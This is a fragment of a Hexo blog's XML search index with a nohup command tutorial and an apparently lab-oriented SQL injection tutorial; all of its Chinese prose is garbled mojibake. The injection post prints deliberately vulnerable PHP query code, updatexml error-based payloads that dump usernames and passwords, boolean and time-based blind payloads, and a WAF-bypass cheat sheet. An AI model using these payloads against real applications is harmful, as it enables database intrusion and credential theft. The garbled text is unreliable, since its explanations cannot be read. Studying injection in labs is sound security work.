<p>æ¥ä¸‹æ¥å°±å¯ä»¥ç”¨åŸŸåæˆ–è€…å…¬ç½‘IPè®¿é—®äº†</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>åšå®¢æ­å»º</tag>
      </tags>
  </entry>
  <entry>
    <title>nohupå‘½ä»¤</title>
    <url>/Linux/nohup%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å¦‚æœä½ æ­£åœ¨è¿è¡Œä¸€ä¸ªè¿›ç¨‹ï¼Œè€Œä¸”ä½ è§‰å¾—åœ¨é€€å‡ºå¸æˆ·æ—¶è¯¥è¿›ç¨‹è¿˜ä¸ä¼šç»“æŸï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ nohup å‘½ä»¤ã€‚</p>
<span id="more"></span>

<h1 id="å‘½ä»¤ç®€ä»‹"><a href="#å‘½ä»¤ç®€ä»‹" class="headerlink" title="å‘½ä»¤ç®€ä»‹"></a>å‘½ä»¤ç®€ä»‹</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nohup Command [ Arg â€¦ ] [ &amp; ]</span><br></pre></td></tr></table></figure>

<p>è¯¥å‘½ä»¤å¯ä»¥åœ¨ä½ é€€å‡ºå¸æˆ·&#x2F;å…³é—­ç»ˆç«¯ä¹‹åç»§ç»­è¿è¡Œç›¸åº”çš„è¿›ç¨‹ã€‚<code>nohup</code>å°±æ˜¯ä¸æŒ‚èµ·çš„æ„æ€ï¼ˆ<code>no hang up</code>ï¼‰ã€‚</p>
<p><code>nohup</code> è¿è¡Œç”± <code>Command</code> å’Œç›¸å…³çš„ <code>Arg</code> å‚æ•°æŒ‡å®šçš„å‘½ä»¤ï¼Œå¿½ç•¥æ‰€æœ‰æŒ‚æ–­ï¼ˆ<code>SIGHUP</code>ï¼‰ä¿¡å·ã€‚è¦è¿è¡Œåå°ä¸­çš„ <code>nohup</code> å‘½ä»¤ï¼Œæ·»åŠ  <code>&amp;</code> ï¼ˆ è¡¨ç¤º <code>and</code> çš„ç¬¦å·ï¼‰åˆ°å‘½ä»¤çš„å°¾éƒ¨ã€‚</p>
<p>å¦‚æœä½¿ç”¨ <code>nohup</code> å‘½ä»¤æäº¤ä½œä¸šï¼Œé‚£ä¹ˆåœ¨ç¼ºçœæƒ…å†µä¸‹è¯¥ä½œä¸šçš„æ‰€æœ‰è¾“å‡ºéƒ½è¢«é‡å®šå‘åˆ°ä¸€ä¸ªåä¸º nohup.out çš„æ–‡ä»¶ä¸­ï¼Œé™¤éå¦å¤–æŒ‡å®šäº†è¾“å‡ºæ–‡ä»¶ã€‚</p>
<h1 id="ä½¿ç”¨ä¸¾ä¾‹"><a href="#ä½¿ç”¨ä¸¾ä¾‹" class="headerlink" title="ä½¿ç”¨ä¸¾ä¾‹"></a>ä½¿ç”¨ä¸¾ä¾‹</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nohup java -jar adapter-minisite.jar /tomcat-1 /tomcat-2 &gt; logs.txt 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>

<p>åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œè¿è¡Œå‘½ä»¤ <code>java -jar adapter-minisite.jar</code> è¾“å…¥å‚æ•° <code>/tomcat-1</code> å’Œ <code>/tomcat-2</code>ï¼Œè¾“å‡ºè¢«é‡å®šå‘åˆ° <code>logs.txt</code> æ–‡ä»¶ä¸­ã€‚</p>
<h1 id="é€€å‡ºä»»åŠ¡"><a href="#é€€å‡ºä»»åŠ¡" class="headerlink" title="é€€å‡ºä»»åŠ¡"></a>é€€å‡ºä»»åŠ¡</h1><p>å¦‚æœè¿è¡Œçš„ä»»åŠ¡åœ¨å½“å‰ <code>shell</code> ç»ˆç«¯ï¼Œå¯ä»¥é€šè¿‡ <code>jobs</code> å‘½ä»¤æŸ¥è¯¢ç›¸å…³ä¿¡æ¯ï¼Œå¹¶ä¸”æ€æ‰è¿›ç¨‹ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æŸ¥çœ‹å½“å‰ shell ç»ˆç«¯çš„åå°è¿è¡Œä»»åŠ¡è¿›ç¨‹ä¿¡æ¯</span><br><span class="line">$ jobs</span><br><span class="line">[1]+ Running nohup java -jar adapter-minisite.jar /tomcat-1 /tomcat-2 &gt; logs.txt 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line"># æ€æ‰ä»»åŠ¡å·</span><br><span class="line">$ kill %1</span><br><span class="line"></span><br><span class="line"># æˆ–ç€æ‰¾åˆ° pid</span><br><span class="line">$ jobs -l</span><br><span class="line">[1]+ 11076 Running nohup java -jar adapter-minisite.jar /tomcat-1 /tomcat-2 &gt; logs.txt 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line">$ kill 11076</span><br><span class="line"></span><br><span class="line"># æˆ–ç€</span><br><span class="line">$ fg %n # ç½®ä¸ºå‰ç«¯è¿è¡Œ</span><br><span class="line"></span><br><span class="line">Ctrl + c # é€€å‡º</span><br></pre></td></tr></table></figure>

<p>å¦‚æœéå½“å‰ <code>shell</code> ç»ˆç«¯ï¼Œå¯ä»¥é€šè¿‡ <code>ps auxf | grep adapter-minisite</code> è·å– <code>pid</code> ç„¶å <code>kill pid</code>ã€‚</p>
]]></content>
      <categories>
        <category>æŒ‡ä»¤</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLæ³¨å…¥è¯¦è§£2.0-é‡æ„ç¯‡</title>
    <url>/SQLInject/SQL%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A32.0-%E9%87%8D%E6%9E%84%E7%AF%87/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><center>å‰è¨€</center></h1><blockquote>
<p>ä¹‹å‰å†™è¿‡ä¸€ç¯‡ï¼Œä½†æ˜¯æ„ˆå‘æ„Ÿè§‰åˆ°ä¹‹å‰å†™çš„è–„å¼±å’Œä¹±ï¼Œæ‰€ä»¥é‡æ„ï¼</p>
</blockquote>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownecEnPtXKhJqdw1B.jpg"></p>
<span id="more"></span>


<h1 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a><center>æ­£æ–‡</center></h1><p>å®é™…ä¸Šæ³¨å…¥ç±»æ¼æ´æœ€<font color="red"> æœ¬è´¨çš„åŸå› å°±æ˜¯</font> ï¼Œ<code>æ··æ·†äº†ä»£ç å’Œæ•°æ®çš„è¾¹ç•Œ</code>ã€‚</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownbP659ZCEGdpOSFm.png"></p>
<ul>
<li>æ³¨å…¥çš„ç±»å‹æ€»çš„å°±åªæœ‰3ç§ï¼š<ul>
<li>è”åˆæ³¨å…¥<ul>
<li>è”åˆæ³¨å…¥ä»ç±»å‹æ¥åˆ’åˆ†åˆæœ‰ï¼š<ol>
<li>æ•°å­—å‹</li>
<li>å­—ç¬¦å‹</li>
</ol>
</li>
<li>è”åˆæ³¨å…¥ä»æ³¨å…¥ç‚¹æ¥åˆ’åˆ†åˆæœ‰ï¼š<ol>
<li>æœç´¢æ¡†æ³¨å…¥</li>
<li>HTTPå¤´æ³¨å…¥<ol>
<li>User-Agentæ³¨å…¥</li>
<li>X-Forwarded-Foræ³¨å…¥</li>
<li>Cookieæ³¨å…¥</li>
</ol>
</li>
</ol>
<ul>
<li>æŠ¥é”™æ³¨å…¥</li>
<li>ç›²æ³¨<ul>
<li>ç›²æ³¨ä»æ–¹å¼æ¥åˆ’åˆ†æœ‰ï¼š<ul>
<li>æ—¶é—´ç›²æ³¨</li>
<li>å¸ƒå°”ç›²æ³¨</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="è”åˆæ³¨å…¥"><a href="#è”åˆæ³¨å…¥" class="headerlink" title="è”åˆæ³¨å…¥"></a><center>è”åˆæ³¨å…¥</center></h1><p>ç”±<font color="red"> union select</font>å¾—åï¼Œæ˜¯ä¸€ç§æœ€å¿«çš„æŸ¥è¯¢æ–¹å¼ã€‚</p>
<p>ä»æ³¨å…¥ç±»å‹æ¥åˆ’åˆ†è®²ã€‚</p>
<h2 id="æ•°å­—å‹"><a href="#æ•°å­—å‹" class="headerlink" title="æ•°å­—å‹"></a>æ•°å­—å‹</h2><p>ä¹Ÿå°±æ˜¯ä¸ç”¨é—­åˆï¼Œç”¨æˆ·çš„è¾“å…¥ç›´æ¥è¢«è§£ææˆäº†æ–°çš„SQLè¯­å¥ã€‚</p>
<p>ä»ä»£ç å±‚é¢æ¥çœ‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id + <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ°<font color="red"> idæ˜¯ä»¥+ç›´æ¥è¿›è¡Œæ‹¼æ¥çš„</font> ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä»ç›´æ¥ç»™idï¼ŒSQLè¯­å¥è®©ä»–ç›´æ¥æ‰§è¡Œä»¥æ­¤äº§ç”ŸSQLæ³¨å…¥ã€‚</p>
<h2 id="å­—ç¬¦å‹"><a href="#å­—ç¬¦å‹" class="headerlink" title="å­—ç¬¦å‹"></a>å­—ç¬¦å‹</h2><p>å­—ç¬¦å‹å°±è¦è¿›è¡Œé—­åˆï¼Œå¹¶ä¸”é—­åˆæ˜¯éå¸¸å…³é”®çš„ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>åœ¨ç¬¬8è¡Œå¯ä»¥æ¸…æ™°çš„çœ‹åˆ°idè¢«å•å¼•å·åŒ…å›´èµ·æ¥ï¼Œå¦‚æœæƒ³è¦å“åº”è‡ªå·±æƒ³è¦æ‰§è¡Œçš„SQLè¯­å¥å°±æ‰§è¡Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br></pre></td></tr></table></figure>


<p>å› ä¸º<font color="red"> å¼•å·çš„å°±è¿‘åŒ¹é…</font> ï¼Œæ‰€ä»¥å•å¼•å·ä¼šå’Œå·¦è¾¹æœ€è¿‘çš„ç¬¦å·åŒ¹é…ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;&#x27;</span><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#<span class="string">&#x27;;&quot;;</span></span><br></pre></td></tr></table></figure>


<p><code>&quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;&#39;</code> æ­¤éƒ¨åˆ†è‡ªæˆä¸€å—</p>
<p><code>#&#39;;&quot;;</code> #ä¹‹åè¢«æ³¨é‡Šã€‚</p>
<p>å› æ­¤ä½ è¾“å…¥çš„SQLè¯­å¥<font color="red"> å°†è¢«ç‹¬ç«‹ä»£å…¥MySQLæ•°æ®åº“è§£æ</font> ï¼Œä»¥æ­¤è¾¾åˆ°æ³¨å…¥çš„æ•ˆæœã€‚</p>
<p>ä¹‹åçš„æŒ‰ç…§æ³¨å…¥ç‚¹åˆ’åˆ†ï¼Œä¹Ÿè¦åˆ¤æ–­æ•°å­—å‹å’Œå­—ç¬¦å‹ï¼Œä»¥æ­¤ç±»æ¨ã€‚æ³¨å…¥è¯­å¥å°†æ”¾åœ¨åé¢ç»Ÿä¸€è®²ã€‚</p>
<h2 id="å å †æ³¨å…¥"><a href="#å å †æ³¨å…¥" class="headerlink" title="å å †æ³¨å…¥"></a>å å †æ³¨å…¥</h2><p>ç¬¼ç»Ÿçš„è®²ï¼Œå å †æ³¨å…¥ä¹Ÿæ˜¯è”åˆæ³¨å…¥ã€‚</p>
<h1 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a><center>æŠ¥é”™æ³¨å…¥</center></h1><p>æµ‹è¯•æ—¶å‘ç°ä¼š<font color="red"> å›æ˜¾æŠ¥é”™ä¿¡æ¯</font> ï¼Œå°±å¯ä»¥è¯•è¯•æŠ¥é”™æ³¨å…¥ã€‚</p>
<ul>
<li>æŠ¥é”™æ³¨å…¥ä¸»è¦ç”¨åˆ°3ä¸ªå‡½æ•°<ul>
<li>floor()</li>
<li>extractvalue()</li>
<li>updatexml()</li>
</ul>
</li>
</ul>
<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><ul>
<li><p>æ•°æ®åº“</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(</span><br><span class="line">database()</span><br><span class="line">),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="keyword">or</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>è¡¨</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(</span><br><span class="line"><span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema)<span class="keyword">like</span>(<span class="string">&#x27;cat&#x27;</span>)</span><br><span class="line">),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="keyword">or</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>åˆ—å</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(</span><br><span class="line"><span class="keyword">select</span>(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name)<span class="keyword">like</span>(<span class="string">&#x27;H4rDsq1&#x27;</span>)</span><br><span class="line">),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="keyword">or</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>dump</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span>(group_concat(id,username,password))<span class="keyword">from</span>(geek.H4rDsq1)</span><br><span class="line">),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="keyword">or</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>å…¶ä»–å‡ ä¸ªå‡½æ•°ä»¥æ­¤ç±»æ¨ï¼Œ<font color="red"> ç»•WAFæ ¹æ®æ•°æ®åº“ç‰ˆæœ¬æ¢æˆæ•°å­¦å‡½æ•°ã€‚</font> </p>
<h1 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a><center>ç›²æ³¨</center></h1><h2 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h2><p><font color="red"> æ ¹æ®é¡µé¢çš„å›æ˜¾ä¸åŒæ¥åˆ¤æ–­</font> ã€‚</p>
<p>Payload</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">çˆ†åº“åï¼š?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left((select database()),1)=&#x27;</span>s<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string">çˆ†è¡¨åï¼š?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">left</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span><span class="string">&#x27;security&#x27;</span> limit <span class="number">3</span>,<span class="number">1</span>),<span class="number">5</span>)<span class="operator">=</span><span class="string">&#x27;users&#x27;</span><span class="comment">--+</span></span><br><span class="line">çˆ†åˆ—æ˜ï¼š?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 1,1),8)=&#x27;</span>username<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string">çˆ†æ•°æ®ï¼š?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">left</span>((<span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> id limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">4</span>)<span class="operator">=</span><span class="string">&#x27;dumb&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>




<h2 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h2><p>æ ¹æ®å›æ˜¾æ—¶é—´çš„ä¸åŒæ¥åˆ¤æ–­ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if((<span class="number">1</span>)<span class="keyword">like</span>(<span class="number">1</span>),<span class="number">5</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>


<p>Payload</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">çˆ†åº“é•¿ï¼š?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(length(database())=8,sleep(5),NULL)--+</span></span><br><span class="line"><span class="string">çˆ†åº“åï¼š?id=1&#x27;</span> <span class="keyword">and</span> if(<span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span>,sleep(<span class="number">5</span>),<span class="keyword">NULL</span>)<span class="comment">--+</span></span><br><span class="line">çˆ†è¡¨åï¼š?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#x27;</span>r<span class="string">&#x27;,sleep(5),NULL)--+</span></span><br><span class="line"><span class="string">çˆ†åˆ—æ˜ï¼š?id=1&#x27;</span> <span class="keyword">and</span> if(<span class="keyword">left</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="operator">=</span> <span class="string">&#x27;users&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">8</span>)<span class="operator">=</span><span class="string">&#x27;username&#x27;</span>,sleep(<span class="number">5</span>),<span class="keyword">NULL</span>)<span class="comment">--+</span></span><br><span class="line">çˆ†æ•°æ®ï¼š?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(left((select username from users order by id limit 0,1),4)=&#x27;</span>dumb<span class="string">&#x27;,sleep(5),NULL)--+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> if(<span class="keyword">left</span>((<span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> id limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">4</span>)<span class="operator">=</span><span class="string">&#x27;dumb&#x27;</span>,sleep(<span class="number">5</span>),<span class="keyword">NULL</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>


<p>å…¶ä»–çš†å¯ä»¥æ­¤ç±»æ¨ã€‚</p>
<h1 id="group-concatçš„ä½¿ç”¨"><a href="#group-concatçš„ä½¿ç”¨" class="headerlink" title="group_concatçš„ä½¿ç”¨"></a><center>group_concatçš„ä½¿ç”¨</center></h1><p><font color="red"> mysqlç‰ˆæœ¬&gt;5.0åˆ‡ä½¿ç”¨äº†information_schemaæ•°æ®åº“  </font> </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(SCHEMA_NAME) <span class="keyword">from</span> (information_schema.schemata )</span><br><span class="line"></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> (information_schema.columns) <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x61646D696E75736572</span></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> group_concat(flag) <span class="keyword">from</span> sqli.flag</span><br></pre></td></tr></table></figure>


<p>å…¶ä»–ä»¥æ­¤ç±»æ¨ã€‚</p>
<h1 id="SQLæ³¨å…¥ç»•è¿‡é€ŸæŸ¥è¡¨"><a href="#SQLæ³¨å…¥ç»•è¿‡é€ŸæŸ¥è¡¨" class="headerlink" title="SQLæ³¨å…¥ç»•è¿‡é€ŸæŸ¥è¡¨"></a><center>SQLæ³¨å…¥ç»•è¿‡é€ŸæŸ¥è¡¨</center></h1><h2 id="è¿‡æ»¤and-or"><a href="#è¿‡æ»¤and-or" class="headerlink" title="è¿‡æ»¤and or"></a>è¿‡æ»¤and or</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span>     â€”â€”<span class="operator">&gt;</span>    <span class="operator">||</span></span><br><span class="line"><span class="keyword">and</span>     â€”â€”<span class="operator">&gt;</span>    <span class="operator">&amp;&amp;</span></span><br><span class="line">xor â€”â€”<span class="operator">&gt;</span> <span class="operator">|</span>   </span><br><span class="line"><span class="keyword">not</span> â€”â€”<span class="operator">&gt;</span> <span class="operator">!</span></span><br><span class="line"></span><br><span class="line">åå…­è¿›åˆ¶ç»•è¿‡</span><br><span class="line"><span class="keyword">or</span> â€”â€”<span class="operator">&gt;</span> o\x72</span><br><span class="line"></span><br><span class="line">å¤§å°å†™ç»•è¿‡</span><br><span class="line"><span class="keyword">Or</span></span><br><span class="line"><span class="keyword">aNd</span></span><br><span class="line"></span><br><span class="line">åŒå†™ç»•è¿‡</span><br><span class="line">oorr</span><br><span class="line">anandd</span><br><span class="line"></span><br><span class="line">urlencodeï¼Œascii(<span class="type">char</span>)ï¼Œhexï¼Œunicodeç¼–ç ç»•è¿‡</span><br><span class="line">    ä¸€äº›unicodeç¼–ç ä¸¾ä¾‹ï¼š</span><br><span class="line">    å•å¼•å·ï¼š<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    %u0027 %u02b9 %u02bc</span></span><br><span class="line"><span class="string">    %u02c8 %u2032</span></span><br><span class="line"><span class="string">    %uff07 %c0%27</span></span><br><span class="line"><span class="string">    %c0%a7 %e0%80%a7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å…³é”®å­—å†…è”æ³¨é‡Šå°è¯•ç»•æ‰€æœ‰</span></span><br><span class="line"><span class="string">/*!or*/</span></span><br><span class="line"><span class="string">/*!and*/</span></span><br></pre></td></tr></table></figure>


<h2 id="å·¦æ‹¬å·è¿‡æ»¤"><a href="#å·¦æ‹¬å·è¿‡æ»¤" class="headerlink" title="å·¦æ‹¬å·è¿‡æ»¤"></a>å·¦æ‹¬å·è¿‡æ»¤</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">urlencodeï¼Œascii(<span class="type">char</span>)ï¼Œhexï¼Œunicodeç¼–ç ç»•è¿‡</span><br><span class="line"><span class="operator">%</span>u0028 <span class="operator">%</span>uff08</span><br><span class="line"><span class="operator">%</span>c0<span class="operator">%</span><span class="number">28</span> <span class="operator">%</span>c0<span class="operator">%</span>a8</span><br><span class="line"><span class="operator">%</span>e0<span class="operator">%</span><span class="number">80</span><span class="operator">%</span>a8</span><br></pre></td></tr></table></figure>


